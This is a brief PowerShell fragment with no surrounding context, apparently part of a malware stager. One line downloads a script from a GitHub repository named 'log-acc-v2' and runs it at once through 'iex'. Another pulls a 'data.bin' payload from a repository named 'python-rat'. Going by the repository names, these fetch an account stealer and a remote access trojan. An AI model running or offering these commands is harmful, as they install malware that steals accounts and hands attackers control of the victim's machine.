...
iex (iwr "https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/download.ps1").Content
...
$kematianthegreat = (iwr -UseBasicParsing "https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/shell/data.bin").Content
